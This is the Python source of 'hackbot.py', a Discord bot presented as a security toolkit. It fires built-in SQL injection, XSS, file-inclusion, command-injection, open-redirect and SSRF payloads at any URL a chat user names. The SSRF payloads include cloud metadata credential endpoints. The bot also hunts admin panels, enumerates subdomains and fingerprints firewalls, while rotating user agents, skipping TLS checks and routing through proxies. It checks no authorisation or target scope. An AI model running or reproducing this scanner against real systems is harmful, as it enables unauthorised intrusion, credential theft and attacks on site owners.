#!/usr/bin/env python3
# hackbot.py — Discord security toolkit
# usage: python hackbot.py <token>

import asyncio
import os
import random
import re
import sys
import time
import urllib.parse as up
from concurrent.futures import ThreadPoolExecutor

import aiohttp
import discord
from discord.ext import commands
from bs4 import BeautifulSoup

try:
    import uvloop
    uvloop.install()
except Exception:
    pass

PREFIX = "/"
TIMEOUT = 10
CONCURRENCY = 40

UA = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_6) AppleWebKit/605.1.15 Version/17.1 Safari/605.1.15",
]

PROXY_FILE = "proxy.txt"


def proxies():
    if not os.path.exists(PROXY_FILE):
        return []
    with open(PROXY_FILE) as f:
        return [l.strip() for l in f if l.strip()]


def headers():
    return {
        "user-agent": random.choice(UA),
        "accept": "*/*",
        "accept-language": "en-US,en;q=0.9",
        "connection": "keep-alive",
    }


# ---------------- SQLi payloads ----------------

SQLI_ERROR = [
    "'", "\"", "')", "\"))", "';", "\";",
    "' OR '1'='1", "' OR 1=1--", "' OR 1=1#", "' OR 1=1/*",
    "\" OR \"1\"=\"1", "\" OR 1=1--",
    "1' AND 1=1--", "1' AND 1=2--",
    "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--", "' UNION SELECT NULL,NULL,NULL,NULL--",
    "' AND SLEEP(5)--", "'; WAITFOR DELAY '0:0:5'--",
    "1' AND (SELECT 1 FROM (SELECT SLEEP(5))x)--",
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
    "' AND UPDATEXML(1,CONCAT(0x7e,VERSION()),1)--",
]

SQL_ERRORS = [
    r"SQL syntax.*MySQL",
    r"Warning.*mysql_",
    r"MySQLSyntaxErrorException",
    r"valid MySQL result",
    r"PostgreSQL.*ERROR",
    r"Warning.*\Wpg_",
    r"valid PostgreSQL result",
    r"Driver.*SQL Server",
    r"OLE DB.*SQL Server",
    r"SQLServer JDBC Driver",
    r"Oracle error",
    r"Oracle.*Driver",
    r"quoted string not properly terminated",
    r"SQLite/JDBCDriver",
    r"SQLite.Exception",
    r"System.Data.SQLite.SQLiteException",
    r"Microsoft Access Driver",
    r"JET Database Engine",
    r"Access Database Engine",
]


def is_sql_error(text):
    for p in SQL_ERRORS:
        if re.search(p, text, re.IGNORECASE):
            return p
    return None


# ---------------- XSS payloads ----------------

XSS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
    "<body onload=alert(1)>",
    "javascript:alert(1)",
    "\"><script>alert(1)</script>",
    "'><svg/onload=alert(1)>",
    "<iframe src=javascript:alert(1)>",
    "<details open ontoggle=alert(1)>",
    "<input autofocus onfocus=alert(1)>",
    "<a href=javascript:alert(1)>x</a>",
    "<math><mtext><table><mglyph><style><!--</style><img title=\"--><img src=1 onerror=alert(1)>\">",
    "<script>alert(document.domain)</script>",
    "<img src=1 onerror=eval(atob('YWxlcnQoMSk='))>",
]


# ---------------- LFI payloads ----------------

LFI = [
    "../../../../etc/passwd",
    "../../../../etc/passwd%00",
    "....//....//....//etc/passwd",
    "..%2f..%2f..%2f..%2fetc/passwd",
    "/etc/passwd",
    "php://filter/convert.base64-encode/resource=index.php",
    "php://filter/read=string.rot13/resource=index.php",
    "expect://id",
    "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+",
    "/proc/self/environ",
    "....//....//....//....//etc/shadow",
    "C:\\Windows\\win.ini",
    "..\\..\\..\\..\\windows\\win.ini",
]


# ---------------- Command injection ----------------

CMDI = [
    ";id",
    "|id",
    "||id",
    "&id",
    "&&id",
    "`id`",
    "$(id)",
    ";id;",
    "\nid",
    "%0aid",
    ";cat /etc/passwd",
    "|cat /etc/passwd",
]


# ---------------- Open redirect ----------------

OPENREDIR = [
    "//evil.com",
    "https://evil.com",
    "http://evil.com",
    "////evil.com",
    "/\\evil.com",
    "https:evil.com",
    "//google.com@evil.com",
    "https://evil.com#.target.com",
    "?url=https://evil.com",
    "?next=https://evil.com",
]


# ---------------- SSRF ----------------

SSRF = [
    "http://127.0.0.1/",
    "http://127.0.0.1:80/",
    "http://127.0.0.1:22/",
    "http://127.0.0.1:3306/",
    "http://localhost/",
    "http://[::1]/",
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://0.0.0.0/",
    "http://192.168.0.1/",
    "http://10.0.0.1/",
    "file:///etc/passwd",
    "gopher://127.0.0.1:6379/_INFO",
    "dict://127.0.0.1:6379/INFO",
]


# ---------------- WAF signatures ----------------

WAF_SIGS = {
    "Cloudflare": ["cloudflare", "cf-ray", "__cfduid", "cf-cache-status"],
    "AWS WAF": ["awselb", "x-amzn-requestid", "x-amz-cf-id"],
    "Akamai": ["akamai", "x-akamai-transformed"],
    "Sucuri": ["x-sucuri-id", "x-sucuri-cache"],
    "Incapsula": ["incap_ses", "visid_incap", "x-iinfo"],
    "F5 BIG-IP": ["bigipserver", "x-wa-info", "ts="],
    "ModSecurity": ["mod_security", "modsecurity"],
    "Barracuda": ["barra_counter_session", "barracuda"],
    "Imperva": ["x-iinfo", "incap_ses"],
    "DenyAll": ["sessioncookie=", "x-denyall"],
}


# ---------------- admin paths ----------------

ADMIN_PATHS = [
    "admin", "admin/", "admin.php", "admin/login", "administrator/",
    "wp-admin/", "wp-login.php", "wp-admin/admin.php",
    "phpmyadmin/", "pma/", "mysql/", "myadmin/",
    "cpanel/", "whm/", "webmail/",
    "login", "login.php", "signin", "auth", "session",
    "dashboard", "panel", "manage", "manager", "console",
    "adminpanel", "admin_area", "admin_area/", "admin1", "admin2",
    "sysadmin", "admin-console", "administrator",
    "backend", "controlpanel", "control/", "admin/login.php",
    "user/login", "account/login", "portal",
    "api/admin", "api/v1/admin", "graphql",
    ".git/", ".env", ".svn/", "backup/", "backups/",
    "config.php", "configuration.php", "web.config", "settings.py",
    "robots.txt", "sitemap.xml", "phpinfo.php", "info.php",
    "server-status", "server-info", ".htaccess", ".htpasswd",
    "test/", "tests/", "dev/", "staging/", "debug/",
]


# ---------------- HTTP helper ----------------

async def http_get(session, url, proxy=None, allow_redirect=False):
    try:
        async with session.get(
            url, headers=headers(), proxy=proxy,
            timeout=aiohttp.ClientTimeout(total=TIMEOUT),
            allow_redirects=allow_redirect,
            ssl=False,
        ) as r:
            body = await r.read()
            return r.status, dict(r.headers), body[:65536]
    except Exception as e:
        return None, {}, b""


async def http_post(session, url, data=None, proxy=None):
    try:
        async with session.post(
            url, data=data, headers=headers(), proxy=proxy,
            timeout=aiohttp.ClientTimeout(total=TIMEOUT),
            allow_redirects=False, ssl=False,
        ) as r:
            body = await r.read()
            return r.status, dict(r.headers), body[:65536]
    except Exception:
        return None, {}, b""


# ---------------- scanners ----------------

async def sqli_scan(url, param=None):
    """Test error-based SQLi + time-based on a URL or on a query param."""
    findings = []
    async with aiohttp.ClientSession() as s:
        if param:
            for p in SQLI_ERROR:
                u = re.sub(rf"{param}=[^&]*", f"{param}={up.quote(p)}", url)
                t0 = time.time()
                status, hdrs, body = await http_get(s, u)
                dt = time.time() - t0
                text = body.decode(errors="ignore")
                err = is_sql_error(text)
                if err:
                    findings.append(("error", p, err))
                if "SLEEP" in p or "WAITFOR" in p:
                    if dt > 4.5:
                        findings.append(("time", p, f"{dt:.1f}s"))
        else:
            for p in SQLI_ERROR:
                u = url + ("" if "?" in url else "?id=") + up.quote(p)
                t0 = time.time()
                status, hdrs, body = await http_get(s, u)
                dt = time.time() - t0
                text = body.decode(errors="ignore")
                err = is_sql_error(text)
                if err:
                    findings.append(("error", p, err))
                if ("SLEEP" in p or "WAITFOR" in p) and dt > 4.5:
                    findings.append(("time", p, f"{dt:.1f}s"))
    return findings


async def xss_scan(url, param=None):
    findings = []
    async with aiohttp.ClientSession() as s:
        for p in XSS:
            u = re.sub(rf"{param}=[^&]*", f"{param}={up.quote(p)}", url) if param else \
                url + ("" if "?" in url else "?q=") + up.quote(p)
            status, hdrs, body = await http_get(s, u)
            text = body.decode(errors="ignore")
            if p in text:
                findings.append(("reflected", p))
    return findings


async def lfi_scan(url, param):
    findings = []
    async with aiohttp.ClientSession() as s:
        for p in LFI:
            u = re.sub(rf"{param}=[^&]*", f"{param}={up.quote(p)}", url)
            status, hdrs, body = await http_get(s, u)
            text = body.decode(errors="ignore")
            if "root:x:0:0" in text or "root:.*:0:0" in text:
                findings.append(("lfi_passwd", p))
            if "[extensions]" in text or "[fonts]" in text:
                findings.append(("lfi_winini", p))
    return findings


async def cmdi_scan(url, param):
    findings = []
    async with aiohttp.ClientSession() as s:
        for p in CMDI:
            u = re.sub(rf"{param}=[^&]*", f"{param}={up.quote(p)}", url)
            t0 = time.time()
            status, hdrs, body = await http_get(s, u)
            text = body.decode(errors="ignore")
            if re.search(r"uid=\d+\([^)]+\) gid=\d+", text):
                findings.append(("cmdi_uid", p))
            if "root:x:0:0" in text:
                findings.append(("cmdi_passwd", p))
            if time.time() - t0 > 4.5 and ("sleep" in p.lower()):
                findings.append(("cmdi_time", p))
    return findings


async def openredir_scan(url, param):
    findings = []
    async with aiohttp.ClientSession() as s:
        for p in OPENREDIR:
            u = re.sub(rf"{param}=[^&]*", f"{param}={up.quote(p)}", url)
            status, hdrs, body = await http_get(s, u, allow_redirect=False)
            loc = hdrs.get("Location", "") or hdrs.get("location", "")
            if "evil.com" in loc:
                findings.append(("openredirect", p, loc))
    return findings


async def ssrf_scan(url, param):
    findings = []
    async with aiohttp.ClientSession() as s:
        for p in SSRF:
            u = re.sub(rf"{param}=[^&]*", f"{param}={up.quote(p)}", url)
            t0 = time.time()
            status, hdrs, body = await http_get(s, u)
            text = body.decode(errors="ignore")
            dt = time.time() - t0
            if "meta-data" in text or "ami-id" in text:
                findings.append(("aws_metadata", p))
            if "computeMetadata" in text or "project-id" in text:
                findings.append(("gcp_metadata", p))
            if "root:x:0:0" in text:
                findings.append(("ssrf_file", p))
            if dt > 4.5:
                findings.append(("ssrf_timeout", p, f"{dt:.1f}s"))
    return findings


async def admin_finder(base):
    base = base.rstrip("/")
    hits = []
    sem = asyncio.Semaphore(CONCURRENCY)
    async with aiohttp.ClientSession() as s:
        async def one(p):
            async with sem:
                u = f"{base}/{p}"
                status, hdrs, body = await http_get(s, u, allow_redirect=False)
                if status and status in (200, 301, 302, 401, 403):
                    if status in (200, 401, 403):
                        hits.append((u, status, len(body)))
        await asyncio.gather(*[one(p) for p in ADMIN_PATHS])
    return hits


async def waf_detect(url):
    async with aiohttp.ClientSession() as s:
        status, hdrs, body = await http_get(s, url)
        text = body.decode(errors="ignore").lower()
        headers_lower = {k.lower(): str(v).lower() for k, v in hdrs.items()}
        found = []
        for waf, sigs in WAF_SIGS.items():
            for sig in sigs:
                if sig in text or any(sig in k for k in headers_lower):
                    found.append(waf)
                    break
        return found, status


async def subdomain_enum(domain, wordlist=None):
    words = wordlist or [
        "www","mail","ftp","webmail","smtp","pop","ns1","ns2","webdisk","ns",
        "cpanel","whm","autodiscover","autoconfig","m","imap","test","ns3",
        "blog","pop3","dev","www2","admin","forum","news","vod","mail2",
        "old","new","mysql","oldmail","test2","staging","api","app","cdn",
        "static","assets","img","images","video","media","shop","store",
        "secure","vpn","portal","direct","remote","server","host","cloud",
        "docs","help","support","status","monitor","stats","track","link",
        "go","redirect","short","auth","login","sso","id","oauth",
    ]
    hits = []
    sem = asyncio.Semaphore(CONCURRENCY)

    async def probe(w):
        async with sem:
            host = f"{w}.{domain}"
            try:
                await asyncio.wait_for(asyncio.get_event_loop().getaddrinfo(host, None), timeout=3)
                hits.append(host)
            except Exception:
                pass

    await asyncio.gather(*[probe(w) for w in words])
    return hits


async def header_inject(url, header_name, header_val):
    async with aiohttp.ClientSession() as s:
        h = headers()
        h[header_name] = header_val
        try:
            async with s.get(url, headers=h, timeout=aiohttp.ClientTimeout(total=TIMEOUT),
                             ssl=False, allow_redirects=False) as r:
                body = await r.read()
                return r.status, dict(r.headers), body[:8192]
        except Exception:
            return None, {}, b""


# ---------------- Discord bot ----------------

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix=PREFIX, intents=intents)

JOBS = {}


def chunk_output(text, size=1900):
    return [text[i:i+size] for i in range(0, len(text), size)]


@bot.event
async def on_ready():
    print(f"online {bot.user}")


@bot.command(name="ping")
async def ping(ctx):
    await ctx.send("pong")


@bot.command(name="sqli")
async def sqli(ctx, url: str, param: str = None):
    m = await ctx.send(f"sqli scan {url} param={param}")
    findings = await sqli_scan(url, param)
    if not findings:
        return await m.edit(content=f"no sqli: {url}")
    out = "\n".join(f"[{t}] {p} :: {e}" for t, p, e in findings[:50])
    await m.edit(content=f"sqli hits={len(findings)}\n```{out[:1900]}```")


@bot.command(name="xss")
async def xss(ctx, url: str, param: str = None):
    m = await ctx.send(f"xss scan {url} param={param}")
    findings = await xss_scan(url, param)
    if not findings:
        return await m.edit(content=f"no xss: {url}")
    out = "\n".join(f"[{t}] {p}" for t, p in findings[:50])
    await m.edit(content=f"xss hits={len(findings)}\n```{out[:1900]}```")


@bot.command(name="lfi")
async def lfi(ctx, url: str, param: str):
    m = await ctx.send(f"lfi scan {url} param={param}")
    findings = await lfi_scan(url, param)
    if not findings:
        return await m.edit(content=f"no lfi: {url}")
    out = "\n".join(f"[{t}] {p}" for t, p in findings[:50])
    await m.edit(content=f"lfi hits={len(findings)}\n```{out[:1900]}```")


@bot.command(name="cmdi")
async def cmdi(ctx, url: str, param: str):
    m = await ctx.send(f"cmdi scan {url} param={param}")
    findings = await cmdi_scan(url, param)
    if not findings:
        return await m.edit(content=f"no cmdi: {url}")
    out = "\n".join(f"[{t}] {p}" for t, p in findings[:50])
    await m.edit(content=f"cmdi hits={len(findings)}\n```{out[:1900]}```")


@bot.command(name="redir")
async def redir(ctx, url: str, param: str):
    m = await ctx.send(f"open redirect scan {url} param={param}")
    findings = await openredir_scan(url, param)
    if not findings:
        return await m.edit(content=f"no open redirect: {url}")
    out = "\n".join(f"[{t}] {p} -> {loc}" for t, p, loc in findings[:50])
    await m.edit(content=f"redir hits={len(findings)}\n```{out[:1900]}```")


@bot.command(name="ssrf")
async def ssrf(ctx, url: str, param: str):
    m = await ctx.send(f"ssrf scan {url} param={param}")
    findings = await ssrf_scan(url, param)
    if not findings:
        return await m.edit(content=f"no ssrf: {url}")
    out = "\n".join(f"[{t}] {p} {r}" for t, p, *rest in [(f[0], f[1], f[2] if len(f) > 2 else "") for f in findings][:50] for r in [rest[0] if rest else ""])
    await m.edit(content=f"ssrf hits={len(findings)}\n```{out[:1900]}```")


@bot.command(name="admin")
async def admin(ctx, base: str):
    m = await ctx.send(f"admin finder {base}")
    hits = await admin_finder(base)
    if not hits:
        return await m.edit(content=f"no admin path: {base}")
    out = "\n".join(f"{u} [{s}] {n}b" for u, s, n in hits[:60])
    await m.edit(content=f"admin hits={len(hits)}\n```{out[:1900]}```")


@bot.command(name="waf")
async def waf(ctx, url: str):
    m = await ctx.send(f"waf detect {url}")
    found, status = await waf_detect(url)
    await m.edit(content=f"status={status}\nwaf: {', '.join(found) if found else 'none'}")


@bot.command(name="subdomains")
async def subdomains(ctx, domain: str):
    m = await ctx.send(f"enumerating subdomains {domain}")
    hits = await subdomain_enum(domain)
    if not hits:
        return await m.edit(content=f"no subdomain: {domain}")
    out = "\n".join(sorted(hits))
    await m.edit(content=f"found={len(hits)}\n```{out[:1900]}```")


@bot.command(name="hdr")
async def hdr(ctx, url: str, name: str, value: str):
    m = await ctx.send(f"header inject {name}={value}")
    status, headers, body = await header_inject(url, name, value)
    out = f"status={status}\n"
    for k, v in list(headers.items())[:30]:
        out += f"{k}: {v}\n"
    await m.edit(content=f"```{out[:1900]}```")


@bot.command(name="toolkit")
async def toolkit(ctx):
    await ctx.send(
        "available:\n"
        "`/sqli <url> [param]` — SQLi scanner (error + time)\n"
        "`/xss <url> [param]` — reflected XSS\n"
        "`/lfi <url> <param>` — local file inclusion\n"
        "`/cmdi <url> <param>` — command injection\n"
        "`/redir <url> <param>` — open redirect\n"
        "`/ssrf <url> <param>` — SSRF\n"
        "`/admin <base>` — admin panel finder\n"
        "`/waf <url>` — WAF fingerprint\n"
        "`/subdomains <domain>` — subdomain enum\n"
        "`/hdr <url> <name> <value>` — custom header request\n"
        "`/all <url> <param>` — run sqli+xss+lfi+cmdi+redir+ssrf"
    )


@bot.command(name="all")
async def all_scan(ctx, url: str, param: str):
    m = await ctx.send(f"running full toolkit on {url} param={param}")
    tasks = [
        sqli_scan(url, param),
        xss_scan(url, param),
        lfi_scan(url, param),
        cmdi_scan(url, param),
        openredir_scan(url, param),
        ssrf_scan(url, param),
    ]
    results = await asyncio.gather(*tasks, return_exceptions=True)
    names = ["sqli", "xss", "lfi", "cmdi", "redir", "ssrf"]
    out = ""
    for n, r in zip(names, results):
        if isinstance(r, Exception):
            out += f"{n}: error\n"
        else:
            out += f"{n}: {len(r)} hits\n"
            for item in r[:10]:
                out += f"  {item}\n"
    for c in chunk_output(out):
        await ctx.send(f"```{c}```")
    await m.delete()


# ---------------- entry ----------------

def main():
    if len(sys.argv) < 2:
        print("usage: python hackbot.py <token>")
        sys.exit(1)
    token = sys.argv[1].strip()
    if "." not in token:
        print("invalid token")
        sys.exit(1)
    bot.run(token)


if __name__ == "__main__":
    main()